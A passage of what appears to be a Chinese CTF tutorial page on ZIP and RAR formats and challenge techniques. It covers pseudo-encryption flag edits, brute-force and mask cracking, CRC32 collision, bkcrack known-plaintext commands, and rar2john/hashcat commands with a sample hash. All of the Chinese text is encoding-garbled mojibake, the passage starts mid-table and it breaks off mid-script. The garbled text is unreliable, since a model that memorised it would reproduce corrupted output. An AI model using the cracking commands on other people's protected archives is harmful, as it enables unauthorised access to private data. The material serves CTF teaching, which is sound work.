<td>æ–‡ä»¶æœ€åä¿®æ”¹æ—¶é—´</td>
</tr>
<tr>
<td>Last mod file date</td>
<td>2</td>
<td>æ–‡ä»¶æœ€åä¿®æ”¹æ—¥æœŸ</td>
</tr>
<tr>
<td>CRC-32</td>
<td>4</td>
<td>æœªå‹ç¼©æ•°æ®çš„CRC32</td>
</tr>
<tr>
<td>Compressed size</td>
<td>4</td>
<td>å‹ç¼©åçš„å¤§å°</td>
</tr>
<tr>
<td>Uncompressed size</td>
<td>4</td>
<td>æœªå‹ç¼©çš„å¤§å°</td>
</tr>
<tr>
<td>File name length</td>
<td>2</td>
<td>æ–‡ä»¶åé•¿åº¦</td>
</tr>
<tr>
<td>Extra field length</td>
<td>2</td>
<td>æ‰©å±•åŒºåŸŸé•¿åº¦</td>
</tr>
<tr>
<td>File comment length</td>
<td>2</td>
<td>æ–‡ä»¶æ³¨é‡Šé•¿åº¦</td>
</tr>
<tr>
<td>Disk number start</td>
<td>2</td>
<td>æ–‡ä»¶å¼€å§‹ä½ç½®æ‰€åœ¨çš„ç£ç›˜ç¼–å·</td>
</tr>
<tr>
<td>Internal file attributes</td>
<td>2</td>
<td>å†…éƒ¨æ–‡ä»¶å±æ€§</td>
</tr>
<tr>
<td>External file attributes</td>
<td>4</td>
<td>å¤–éƒ¨æ–‡ä»¶å±æ€§</td>
</tr>
<tr>
<td>Relative offset of local header</td>
<td>4</td>
<td>æœ¬åœ°æ–‡ä»¶å¤´çš„ç›¸å¯¹åç§»</td>
</tr>
<tr>
<td>File name</td>
<td>N</td>
<td>æ–‡ä»¶å</td>
</tr>
<tr>
<td>Extra field</td>
<td>N</td>
<td>æ‰©å±•åŒºåŸŸ</td>
</tr>
<tr>
<td>File comment</td>
<td>N</td>
<td>æ–‡ä»¶æ³¨é‡Š</td>
</tr>
</tbody></table>
<p>æ•°å­—ç­¾åï¼š<br>æ­¤åŒºåŸŸä¸æ˜¯å¿…é¡»çš„</p>
<table>
<thead>
<tr>
<th>å­—æ®µåç§°</th>
<th>é•¿åº¦(byte)</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>Header signature</td>
<td>4</td>
<td>å¤´æ ‡è¯†ï¼Œå›ºå®šå€¼(50 4B 05 05)</td>
</tr>
<tr>
<td>Size of data</td>
<td>2</td>
<td>æ•°æ®çš„å¤§å°</td>
</tr>
<tr>
<td>Signature data</td>
<td>N</td>
<td>ç­¾åæ•°æ®</td>
</tr>
</tbody></table>
<h3 id="ç›®å½•ç»“æŸæ ‡è¯†-End-of-central-directory-record"><a href="#ç›®å½•ç»“æŸæ ‡è¯†-End-of-central-directory-record" class="headerlink" title="ç›®å½•ç»“æŸæ ‡è¯†(End of central directory record)"></a>ç›®å½•ç»“æŸæ ‡è¯†(End of central directory record)</h3><table>
<thead>
<tr>
<th>å­—æ®µåç§°</th>
<th>é•¿åº¦(byte)</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>End of central directory signature</td>
<td>4</td>
<td>ä¸­å¿ƒç›®å½•ç»“æŸæ ‡è¯†ï¼Œå›ºå®šå€¼(50 4B 05 06)</td>
</tr>
<tr>
<td>Number of this disk</td>
<td>2</td>
<td>å½“å‰ç£ç›˜ç¼–å·</td>
</tr>
<tr>
<td>Number of the disk with the start of the central directory</td>
<td>2</td>
<td>ä¸­å¿ƒç›®å½•å¼€å¤´æ‰€åœ¨çš„ç£ç›˜å·</td>
</tr>
<tr>
<td>Total number of entries in the central directory on this disk</td>
<td>2</td>
<td>è¯¥ç£ç›˜ä¸Šä¸­å¿ƒç›®å½•çš„æ¡ç›®æ€»æ•°</td>
</tr>
<tr>
<td>Total number of entries in the central directory</td>
<td>2</td>
<td>ä¸­å¿ƒç›®å½•çš„æ¡ç›®æ€»æ•°</td>
</tr>
<tr>
<td>Size of the central directory</td>
<td>4</td>
<td>ä¸­å¿ƒç›®å½•çš„å¤§å°</td>
</tr>
<tr>
<td>Offset of start of central directory with respect to the starting disk number</td>
<td>4</td>
<td>ä¸­å¿ƒç›®å½•å¼€å§‹ä½ç½®ç›¸å¯¹äºå‹ç¼©æ–‡æ¡£å¼€å§‹ä½ç½®çš„åç§»</td>
</tr>
<tr>
<td>.ZIP file comment length</td>
<td>2</td>
<td>.ZIPæ–‡ä»¶æ³¨é‡Šé•¿åº¦</td>
</tr>
<tr>
<td>.ZIP file comment</td>
<td>N</td>
<td>.ZIPæ–‡ä»¶æ³¨é‡Š</td>
</tr>
</tbody></table>
<h2 id="å¸¸è§è€ƒç‚¹"><a href="#å¸¸è§è€ƒç‚¹" class="headerlink" title="å¸¸è§è€ƒç‚¹"></a>å¸¸è§è€ƒç‚¹</h2><h3 id="ä¼ªåŠ å¯†"><a href="#ä¼ªåŠ å¯†" class="headerlink" title="ä¼ªåŠ å¯†"></a>ä¼ªåŠ å¯†</h3><p>ä¼ªåŠ å¯†å¯ä»¥è¯´æ˜¯éå¸¸å¸¸è§ï¼ŒåŸºç¡€çš„è€ƒç‚¹äº†ï¼Œæ­£å¦‚åå­—ä¸­çš„<code>ä¼ª</code>ï¼Œå®ƒæœ¬èº«å¹¶æ²¡æœ‰åŠ å¯†ï¼Œä½†æ˜¯é€šè¿‡ä¿®æ”¹<code>é€šç”¨ä½æ ‡è®°</code>ï¼Œå¯ä»¥ä½¿å¾—è§£å‹è½¯ä»¶è®¤ä¸ºè¿™ä¸ªæ–‡ä»¶å­˜åœ¨åŠ å¯†</p>
<p>ä¾‹é¢˜ï¼š<a href="https://buuoj.cn/challenges#zip%E4%BC%AA%E5%8A%A0%E5%AF%86">BUU-zipä¼ªåŠ å¯†</a></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯éœ€è¦å¯†ç çš„</p>
<p><img src="/img/summary/misc/misc-compress-3.png"></p>
<p><code>010 editor</code>æŸ¥çœ‹ï¼Œä¿®æ”¹<code>é€šç”¨ä½æ ‡è®°</code>ä¸º<code>0x0000</code></p>
<p><img src="/img/summary/misc/misc-compress-4.png"></p>
<p>ä¿®æ”¹åå¯ä»¥ç›´æ¥è§£å‹äº†</p>
<h3 id="æš´åŠ›ç ´è§£"><a href="#æš´åŠ›ç ´è§£" class="headerlink" title="æš´åŠ›ç ´è§£"></a>æš´åŠ›ç ´è§£</h3><p>ä½¿ç”¨å·¥å…·(archpr)æˆ–è€…è„šæœ¬(python)å¯¹å‹ç¼©åŒ…è¿›è¡Œæš´åŠ›ç ´è§£å¯†ç </p>
<p>åŸºæœ¬å¯ä»¥åˆ†ä¸º<code>çº¯æš´åŠ›</code>ï¼Œ<code>æ©ç </code>ï¼Œ<code>å­—å…¸</code></p>
<p>çº¯æš´åŠ›ï¼šä¸€èˆ¬æ˜¯å¼±å£ä»¤æˆ–è€…çº¯æ•°å­—</p>
<p>æ©ç ï¼šçŸ¥é“äº†å¯†ç çš„ä¸€éƒ¨åˆ†ï¼Œç”¨æ©ç è¿›è¡Œçˆ†ç ´ã€‚ä¾‹å¦‚<code>??ert??</code>å¯ä»¥å»åŒ¹é…ä¸­é—´ä¸º<code>ert</code>çš„å¯†ç </p>
<p><img src="/img/summary/misc/misc-compress-5.png"></p>
<p>å­—å…¸ï¼šç”¨é¢˜ç›®ä¸­ç»™å‡ºçš„æˆ–è‡ªå·±çš„å¼±å£ä»¤å­—å…¸å»è·‘</p>
<h3 id="CRC32ç¢°æ’"><a href="#CRC32ç¢°æ’" class="headerlink" title="CRC32ç¢°æ’"></a>CRC32ç¢°æ’</h3><p>æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰å”¯ä¸€çš„<code>CRC32</code>å€¼ï¼Œå³ä½¿æ–‡ä»¶ä¸­æœ‰ä¸ªä¸€ä¸ª<code>bit</code>å‘ç”Ÿäº†å˜åŒ–ï¼Œ<code>CRC32</code>å€¼ä¹Ÿä¼šä¸åŒ</p>
<p><code>CRC32</code>çˆ†ç ´å°±æ˜¯çŸ¥é“æ–‡ä»¶ä¸­ä¸€æ®µæ•°æ®çš„é•¿åº¦å’Œæ–‡ä»¶çš„<code>CRC32</code>å€¼ï¼Œé€šè¿‡è„šæœ¬ç¨‹åºï¼Œåˆ©ç”¨ç©·ä¸¾æ³•ï¼Œä¸å…¶<code>CRC32</code>å¯¹ç…§ï¼Œä»è€Œè¾¾åˆ°çŒœè§£æ•°æ®çš„ç›®çš„ï¼ˆé€šå¸¸åªé€‚ç”¨äºè¾ƒå°çš„æ–‡æœ¬æ–‡ä»¶ï¼Œæ–‡ä»¶å¤ªå¤§ç©·ä¸¾éš¾åº¦å¤ªå¤§ï¼‰</p>
<p>ä¾‹é¢˜ï¼š<a href="https://buuoj.cn/challenges#zip">BUU-zip</a></p>
<p><a href="https://github.com/kmyk/zip-crc-cracker">githubè„šæœ¬1</a><br><a href="https://github.com/theonlypwner/crc32">githubè„šæœ¬2</a></p>
<p>ä¸‹è½½é™„ä»¶ï¼Œè§£å‹å¾—åˆ°<code>68</code>ä¸ªå‹ç¼©åŒ…ï¼Œå¹¶ä¸”æ¯ä¸ªå‹ç¼©æ–‡ä»¶é‡Œéƒ½æœ‰ä¸€ä¸ª<code>4</code>ä¸ªå­—èŠ‚å¤§å°çš„åä¸º<code>data.txt</code>çš„<code>txt</code>æ–‡ä»¶ï¼Œäºæ˜¯å°è¯•ç”¨<code>crc32</code>ç¢°æ’è¿˜åŸå‡ºæ‰€æœ‰å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶å†…å®¹</p>
<p><img src="/img/summary/misc/misc-compress-6.png"></p>
<p>å¾—åˆ°ä¸€ä¸²base64ç¼–ç åçš„å­—ç¬¦ä¸²ï¼Œè§£å‹åä¿®å¤å‹ç¼©åŒ…å¾—åˆ°flag</p>
<h3 id="æ˜æ–‡æ”»å‡»"><a href="#æ˜æ–‡æ”»å‡»" class="headerlink" title="æ˜æ–‡æ”»å‡»"></a>æ˜æ–‡æ”»å‡»</h3><p>æ˜æ–‡æ”»å‡»æ˜¯ä¸€ç§è¾ƒä¸ºé«˜æ•ˆçš„æ”»å‡»æ‰‹æ®µï¼Œå¤§è‡´åŸç†æ˜¯å½“ä½ ä¸çŸ¥é“ä¸€ä¸ªzipçš„å¯†ç ï¼Œä½†æ˜¯ä½ æœ‰zipä¸­çš„ä¸€ä¸ªå·²çŸ¥æ–‡ä»¶ï¼ˆæ–‡ä»¶å¤§å°è¦å¤§äº12Byteï¼‰æ—¶ï¼Œå› ä¸ºåŒä¸€ä¸ªzipå‹ç¼©åŒ…é‡Œçš„æ‰€æœ‰æ–‡ä»¶éƒ½æ˜¯ä½¿ç”¨åŒä¸€ä¸ªåŠ å¯†å¯†é’¥æ¥åŠ å¯†çš„ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å·²çŸ¥æ–‡ä»¶æ¥æ‰¾åŠ å¯†å¯†é’¥ï¼Œåˆ©ç”¨å¯†é’¥æ¥è§£é”å…¶ä»–åŠ å¯†æ–‡ä»¶ã€‚</p>
<p>æ³¨æ„ï¼šæ˜æ–‡å¯¹åº”æ–‡ä»¶çš„åŠ å¯†ç®—æ³•éœ€è¦æ˜¯<code>ZipCrypto Store</code>(linuxä¸‹å¯ä»¥ç”¨unzip -vç­‰å‘½ä»¤æŸ¥çœ‹)</p>
<p><a href="https://flandre-scarlet.moe/blog/1685/">ZIP æ˜æ–‡æ”»å‡»åŸç†</a></p>
<p>ä¾‹é¢˜ï¼š<a href="https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB">BUU-[ACTFæ–°ç”Ÿèµ›2020]æ˜æ–‡æ”»å‡»</a></p>
<p><img src="/img/summary/misc/misc-compress-7.png"></p>
<p><img src="/img/summary/misc/misc-compress-8.png"></p>
<h3 id="æ·±å…¥æ˜æ–‡æ”»å‡»-bkcrack"><a href="#æ·±å…¥æ˜æ–‡æ”»å‡»-bkcrack" class="headerlink" title="æ·±å…¥æ˜æ–‡æ”»å‡»-bkcrack"></a>æ·±å…¥æ˜æ–‡æ”»å‡»-bkcrack</h3><p>ä¸Šä¸ªä¾‹å­çš„æ˜æ–‡æ”»å‡»ä½¿ç”¨çš„æ˜¯å®Œæ•´çš„æ–‡ä»¶ï¼Œä½†æ˜¯æœ‰æ—¶å€™æ²¡æœ‰æ–‡ä»¶ï¼ŒåªçŸ¥é“åŠ å¯†æ–‡ä»¶çš„ä¸€éƒ¨åˆ†å­—èŠ‚æ•°æ®(è‡³å°‘12ä¸ªå­—èŠ‚åŠåç§»)ï¼Œè¿™æ—¶å€™å¦‚æœæ»¡è¶³åŠ å¯†ç®—æ³•(ZipCrypto Store)æ¡ä»¶ï¼Œå°±å¯ä»¥ä½¿ç”¨æ·±å…¥æ˜æ–‡æ”»å‡»</p>
<p>ä¾‹é¢˜ï¼š2022è¥¿æ¹–è®ºå‰‘-take_the_zip_easy</p>
<p>å·²çŸ¥ç®—æ³•ä¸º<code>ZipCrypto Store</code>ï¼Œä¸”æœ‰ä¸€ä¸ªzipæ–‡ä»¶ï¼Œå°±å¯ä»¥å¾—çŸ¥æ–‡ä»¶å¤´ä¸º<code>504B030414000000</code></p>
<p><img src="/img/summary/misc/misc-compress-9.png"></p>
<p><code>echo -n &quot;dasflow.pcapng&quot; &gt; plain.out</code><br><code>./bkcrack -C zipeasy.zip -c dasflow.zip -p plain.out -o 30 -x 0 504B030414000000</code></p>
<p>å‚æ•°è§£é‡Šï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">-C åŠ å¯†å‹ç¼©åŒ…<br>-c æå–çš„å¯†æ–‡éƒ¨åˆ†<br>-p æå–çš„æ˜æ–‡éƒ¨åˆ†<br>-o offset  -på‚æ•°æŒ‡å®šçš„æ˜æ–‡åœ¨å‹ç¼©åŒ…å†…ç›®æ ‡æ–‡ä»¶çš„åç§»é‡<br>-x å‹ç¼©åŒ…å†…ç›®æ ‡æ–‡ä»¶çš„åç§»åœ°å€  éƒ¨åˆ†å·²çŸ¥æ˜æ–‡å€¼<br></code></pre></td></tr></table></figure>

<p><code>-o</code>ä¸º<code>30</code>æ˜¯å› ä¸ºåœ¨zipæ ¼å¼ä¸­ç¬¬ä¸‰åä½å›ºå®šä¸ºå‹ç¼©æ–‡ä»¶çš„åå­—</p>
<p><img src="/img/summary/misc/misc-compress-10.png"></p>
<p>æ‹¿åˆ°keyï¼š<code>2b7d78f3 0ebcabad a069728c</code>ï¼Œè¿™ä¸ªè¿˜ä¸æ˜¯çœŸæ­£çš„å¯†ç </p>
<p><img src="/img/summary/misc/misc-compress-11.png"></p>
<p>é€šè¿‡<code>key</code>ä¿®æ”¹å¯†ç ä¸º<code>easy</code>ï¼Œä¿å­˜åˆ°<code>easy.zip</code><br><code>./bkcrack -C zipeasy.zip -k 2b7d78f3 0ebcabad a069728c -U easy.zip easy</code></p>
<p><img src="/img/summary/misc/misc-compress-12.png"></p>
<h1 id="RARæ–‡ä»¶"><a href="#RARæ–‡ä»¶" class="headerlink" title="RARæ–‡ä»¶"></a>RARæ–‡ä»¶</h1><h2 id="æ–‡ä»¶ç»“æ„åˆ†æ-1"><a href="#æ–‡ä»¶ç»“æ„åˆ†æ-1" class="headerlink" title="æ–‡ä»¶ç»“æ„åˆ†æ"></a>æ–‡ä»¶ç»“æ„åˆ†æ</h2><p>RARä¸åŒäºZIPï¼ŒRARæ˜¯ä¸€ç§ä¸“åˆ©æ–‡ä»¶æ ¼å¼<br>2.0 ç‰ˆæœ¬å‰åŠ å¯†ç®—æ³•æœªå…¬å¼€ï¼Œ2.0 ç‰ˆæœ¬åä½¿ç”¨AESç®—æ³•åŠ å¯†</p>
<p>RAR 5.0ç­¾åå’ŒRAR4.xçš„ç­¾åä¸ä¸€æ ·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs test">RAR 5.0 ç­¾åç”±8ä¸ªå­—èŠ‚ç»„æˆ:<br>0x52 0x61 0x72 0x21 0x1A 0x07 0x01 0x00<br><br>RAR 4.x ç­¾åç”±7å­—èŠ‚ç»„æˆ:<br>0x52 0x61 0x72 0x21 0x1A 0x07 0x00<br></code></pre></td></tr></table></figure>

<p><strong>å› ä¸ºraræ˜¯å•†ä¸šæ ¼å¼ï¼Œæ‰€ä»¥ä¸åŒè½¯ä»¶ä¸åŒç‰ˆæœ¬æ‰€å‹ç¼©å‡ºæ¥çš„å¯èƒ½ä¼šæœ‰ç»†å¾®å·®åˆ«ï¼Œå¯ä»¥å‚è€ƒ010ä¸­çš„raræ¨¡æ¿</strong></p>
<p>æœ¬æ–‡ä»¥RAR4.xä¸ºä¾‹å­ï¼Œå¯ä»¥å¤§è‡´åˆ†ä¸ºå››éƒ¨åˆ†</p>
<p><img src="/img/summary/misc/misc-compress-13.png"></p>
<h3 id="æ ‡è®°å—-MARK-HEAD"><a href="#æ ‡è®°å—-MARK-HEAD" class="headerlink" title="æ ‡è®°å—(MARK_HEAD)"></a>æ ‡è®°å—(MARK_HEAD)</h3><table>
<thead>
<tr>
<th>å­—æ®µåç§°</th>
<th>é•¿åº¦(byte)</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>HEAD_CRC</td>
<td>2</td>
<td>æ€»æ˜¯0x6152</td>
</tr>
<tr>
<td>HEAD_TYPE</td>
<td>1</td>
<td>0x72</td>
</tr>
<tr>
<td>HEAD_FLAGS</td>
<td>2</td>
<td>æ€»æ˜¯0x1A21</td>
</tr>
<tr>
<td>HEAD_SIZE</td>
<td>2</td>
<td>å—å¤§å° &#x3D; 0x0007ï¼Œå³7ä¸ªå­—èŠ‚</td>
</tr>
</tbody></table>
<p>æ‰€ä»¥è¿™é‡Œæ ‡è®°å—çš„å¤§å°å›ºå®šæ˜¯<code>7</code>ä¸ªå­—èŠ‚ï¼Œä¸”æ˜¯ä¸€ä¸ªå›ºå®šçš„å­—èŠ‚åºåˆ—ã€‚æ ‡è®°å—ä¹Ÿç§°ä¸ºMagic numberã€‚</p>
<h3 id="å‹ç¼©æ–‡ä»¶å¤´-MAIN-HEAD"><a href="#å‹ç¼©æ–‡ä»¶å¤´-MAIN-HEAD" class="headerlink" title="å‹ç¼©æ–‡ä»¶å¤´(MAIN_HEAD)"></a>å‹ç¼©æ–‡ä»¶å¤´(MAIN_HEAD)</h3><table>
<thead>
<tr>
<th>å­—æ®µåç§°</th>
<th>é•¿åº¦(byte)</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>HEAD_CRC</td>
<td>2</td>
<td>HEAD_TYPEåˆ°RESERVED2çš„CRC</td>
</tr>
<tr>
<td>HEAD_TYPE</td>
<td>1</td>
<td>0x73</td>
</tr>
<tr>
<td>HEAD_FLAGS</td>
<td>2</td>
<td>ä½æ ‡è®°</td>
</tr>
<tr>
<td>HEAD_SIZE</td>
<td>2</td>
<td>å‹ç¼©æ–‡ä»¶å¤´æ€»å¤§å°ï¼ˆåŒ…æ‹¬å‹ç¼©æ–‡ä»¶æ³¨é‡Šï¼‰</td>
</tr>
<tr>
<td>RESERVED1</td>
<td>2</td>
<td>ä¿ç•™</td>
</tr>
<tr>
<td>RESERVED2</td>
<td>4</td>
<td>ä¿ç•™</td>
</tr>
</tbody></table>
<p>å¯¹äºå‹ç¼©æ–‡ä»¶å¤´é‡Œçš„ä½æ ‡è®°ï¼Œå¦‚æœå®ƒçš„ç¬¬9ä½(ä»å·¦åˆ°å³)è¢«ç½®1(åˆ™ä½æ ‡è®°åº”ä¸º0x0080)ï¼Œå—å¤´è¢«åŠ å¯†ï¼Œä¹Ÿå°±æ˜¯é€šå¸¸æ‰€è¯´çš„åŠ å¯†æ–‡ä»¶åï¼Œæ‰“å¼€è¿™æ ·åŠ å¯†çš„RARæ–‡ä»¶æ—¶ï¼Œéœ€è¦å…ˆè¾“å…¥å¯†ç æ‰èƒ½çœ‹åˆ°å‹ç¼©åŒ…å†…çš„æ–‡ä»¶åˆ—è¡¨</p>
<h3 id="æ–‡ä»¶å¤´-FILE-HEAD"><a href="#æ–‡ä»¶å¤´-FILE-HEAD" class="headerlink" title="æ–‡ä»¶å¤´(FILE_HEAD)"></a>æ–‡ä»¶å¤´(FILE_HEAD)</h3><table>
<thead>
<tr>
<th>å­—æ®µåç§°</th>
<th>é•¿åº¦(byte)</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>HEAD_CRC</td>
<td>2</td>
<td>ä»HEAD_TYPEåˆ°FILE_NAMEçš„CRC</td>
</tr>
<tr>
<td>HEAD_TYPE</td>
<td>1</td>
<td>0x74</td>
</tr>
<tr>
<td>HEAD_FLAGS</td>
<td>2</td>
<td>ä½æ ‡è®°</td>
</tr>
<tr>
<td>HEAD_SIZE</td>
<td>2</td>
<td>æ–‡ä»¶å¤´çš„å…¨éƒ¨å¤§å°(åŒ…å«æ–‡ä»¶åå’Œæ³¨é‡Š)</td>
</tr>
<tr>
<td>PACK_SIZE</td>
<td>4</td>
<td>å·²å‹ç¼©æ–‡ä»¶å¤§å°</td>
</tr>
<tr>
<td>UNP_SIZE</td>
<td>4</td>
<td>æœªå‹ç¼©æ–‡ä»¶å¤§å°</td>
</tr>
<tr>
<td>HOST_OS</td>
<td>1</td>
<td>ä¿å­˜å‹ç¼©æ–‡ä»¶ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿ</td>
</tr>
<tr>
<td>FILE_CRC</td>
<td>4</td>
<td>æ–‡ä»¶CRC</td>
</tr>
<tr>
<td>FTIME</td>
<td>4</td>
<td>MS DOSæ ‡å‡†æ ¼å¼çš„æ—¥æœŸå’Œæ—¶é—´</td>
</tr>
<tr>
<td>UNP_VER</td>
<td>1</td>
<td>è§£å‹æ–‡ä»¶æ‰€éœ€è¦æœ€ä½RARç‰ˆæœ¬ï¼Œç‰ˆæœ¬ç¼–ç æ–¹æ³•ï¼š10 * ä¸»ç‰ˆæœ¬ + å‰¯ç‰ˆæœ¬ã€‚</td>
</tr>
<tr>
<td>METHOD</td>
<td>1</td>
<td>å‹ç¼©æ–¹å¼</td>
</tr>
<tr>
<td>NAME_SIZE</td>
<td>2</td>
<td>æ–‡ä»¶åå¤§å°</td>
</tr>
<tr>
<td>ATTR</td>
<td>4</td>
<td>æ–‡ä»¶å±æ€§</td>
</tr>
<tr>
<td>HIGH_PACK_SIZE</td>
<td>4</td>
<td>å¯é€‰å€¼ï¼Œå·²å‹ç¼©æ–‡ä»¶å¤§å°64ä½å€¼çš„é«˜4å­—èŠ‚ã€‚åªHEAD_FLAGSä¸­çš„0x100ä½è¢«è®¾ç½®æ‰å­˜åœ¨ã€‚</td>
</tr>
<tr>
<td>HIGH_UNP_SIZE</td>
<td>4</td>
<td>å¯é€‰å€¼ï¼Œæœªå‹ç¼©æ–‡ä»¶å¤§å°64ä½å€¼çš„é«˜4å­—èŠ‚ã€‚åªæœ‰HEAD_FLAGSä¸­çš„0x100ä½è¢«è®¾ç½®æ‰å­˜åœ¨ã€‚</td>
</tr>
<tr>
<td>FILE_NAME</td>
<td>NAME_SIZE</td>
<td>æ–‡ä»¶å - NAME_SIZEå­—èŠ‚å¤§å°å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>SALT</td>
<td>8</td>
<td>å¯é€‰å€¼ï¼Œå¦‚æœ(HEAD_FLAGS &amp; 0x400)!&#x3D; 0ï¼Œåˆ™å­˜åœ¨</td>
</tr>
<tr>
<td>EXT_TIME</td>
<td>å¯å˜å¤§å°</td>
<td>å¯é€‰å€¼ï¼Œæ‰©å±•æ—¶é—´åŒºåŸŸï¼Œå¦‚æœ(HEAD_FLAGS &amp; 0x1000)!&#x3D; 0ï¼Œåˆ™å­˜åœ¨</td>
</tr>
</tbody></table>
<p>åœ¨è¿™ä¸ªå—ä¸­ï¼Œå­˜åœ¨ä¸¤ä¸ªCRCå€¼ï¼Œä¸€ä¸ªæ˜¯æ–‡ä»¶å¤´å—ä¸­ä»å—ç±»å‹åˆ°æ–‡ä»¶åçš„æ ¡éªŒï¼Œåä¸€ä¸ªåˆ™æ˜¯å‹ç¼©åŒ…ä¸­æ‰€å«æ–‡ä»¶çš„CRCæ ¡éªŒï¼Œè§£å‹æ—¶ï¼Œä¼šè®¡ç®—è§£å‹åç”Ÿæˆæ–‡ä»¶çš„CRCå€¼ï¼Œå¦‚æœç­‰äºè¿™é‡Œçš„CRCï¼Œåˆ™è§£å‹å®Œæˆï¼Œå¦‚æœä¸åŒï¼Œåˆ™æŠ¥é”™ä¸­æ–­ã€‚</p>
<h3 id="ç»“å°¾å—-ENDARC-HEAD"><a href="#ç»“å°¾å—-ENDARC-HEAD" class="headerlink" title="ç»“å°¾å—(ENDARC_HEAD)"></a>ç»“å°¾å—(ENDARC_HEAD)</h3><table>
<thead>
<tr>
<th>å­—æ®µåç§°</th>
<th>é•¿åº¦(byte)</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>HEAD_CRC</td>
<td>2</td>
<td>ä»HEAD_TYPE åˆ°HEAD_SIZE çš„CRCæ ¡éªŒå€¼</td>
</tr>
<tr>
<td>HEAD_TYPE</td>
<td>1</td>
<td>0x7B</td>
</tr>
<tr>
<td>HEAD_FLAGS</td>
<td>2</td>
<td>ä½æ ‡è®°</td>
</tr>
<tr>
<td>HEAD_SIZE</td>
<td>2</td>
<td>ç»“å°¾å—å¤§å°</td>
</tr>
</tbody></table>
<p>ä¸æ ‡è®°å—ç±»ä¼¼çš„æ˜¯ï¼Œç»“å°¾å—ä¹Ÿæ˜¯ä¸€ä¸ªå›ºå®šå­—èŠ‚ä¸²çš„å—ï¼Œä¾æ¬¡æ˜¯<code>C4 3D 7B 00 40 07 00</code></p>
<h2 id="å¸¸è§è€ƒç‚¹-1"><a href="#å¸¸è§è€ƒç‚¹-1" class="headerlink" title="å¸¸è§è€ƒç‚¹"></a>å¸¸è§è€ƒç‚¹</h2><h3 id="æš´åŠ›ç ´è§£-1"><a href="#æš´åŠ›ç ´è§£-1" class="headerlink" title="æš´åŠ›ç ´è§£"></a>æš´åŠ›ç ´è§£</h3><p>æ¯”å¦‚ï¼š</p>
<p>rar2johnå…ˆæå–hash<br><code>$rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602</code></p>
<p>hashcatçˆ†ç ´å¯†ç <br><code>hashcat -m 13000 -a 3 $rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602 ?u?u?u?u?u?u</code></p>
<h3 id="ä¼ªåŠ å¯†-1"><a href="#ä¼ªåŠ å¯†-1" class="headerlink" title="ä¼ªåŠ å¯†"></a>ä¼ªåŠ å¯†</h3><p>raråœ¨ä¼ªåŠ å¯†çŠ¶æ€ä¸‹ä¼šæ˜¾ç¤ºå‹ç¼©åŒ…å·²æŸåæˆ–å‹ç¼©æ ¼å¼æœªçŸ¥ï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“åˆ¤æ–­raræ˜¯å¦æ˜¯ä¼ªåŠ å¯†</p>
<p>ä¿®æ”¹<code>FILE_HEAD</code>ä¸­çš„<code>HEAD_FLAGS</code>å³å¯</p>
<p><img src="/img/summary/misc/misc-compress-15.png"></p>
<p>ä¾‹é¢˜ï¼š<a href="https://buuoj.cn/match/matches/2/challenges#%E5%86%B0%E5%86%B0%E5%A5%BD%E5%83%8F%E8%97%8F%E7%9D%80%E7%A7%98%E5%AF%86">BUU-[VNCTF 2021]å†°å†°å¥½åƒè—ç€ç§˜å¯†</a></p>
<p>ä¸€æ‰“å¼€å°±æ˜¯ä¸€å †æŠ¥é”™</p>
<p><img src="/img/summary/misc/misc-compress-14.png"></p>
<p>ä¿®æ”¹ç¬¬24å­—èŠ‚ä¸º<code>80</code>å³å¯æ­£å¸¸æ‰“å¼€</p>
<h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><h2 id="Zipbomb"><a href="#Zipbomb" class="headerlink" title="Zipbomb"></a>Zipbomb</h2><p>å‹ç¼©åŒ…ç‚¸å¼¹ï¼Œåˆ©ç”¨å‹ç¼©ç®—æ³•çš„ç‰¹æ€§ï¼Œåšåˆ°ä»…ä»…å‡ kbå’Œä»…mbçš„å‹ç¼©åŒ…æ–‡ä»¶ï¼Œè§£å‹å‡ºæ¥GBï¼Œç”šè‡³PBçº§çš„æ•°æ®</p>
<p>pythonè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os.path<br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> re<br><br>dir_path=<span class="hljs-string">&#x27;C:\\Users\\19307\\Desktop\\11aa\\a&#x27;</span><br>files= os.listdir(dir_path)<br>newfiles = files[::-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(newfiles)<br><br><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> newfiles:<br>    position = dir_path+<span class="hljs-string">&#x27;\\&#x27;</span>+ file<br>    <span class="hljs-built_in">print</span> (position)<br>    z = zipfile.ZipFile(position, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> z.namelist():<br>        <span class="hljs-built_in">bytes</span> = z.read(filename)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Zmxh&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytes</span> <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytes</span>:<br>            <span 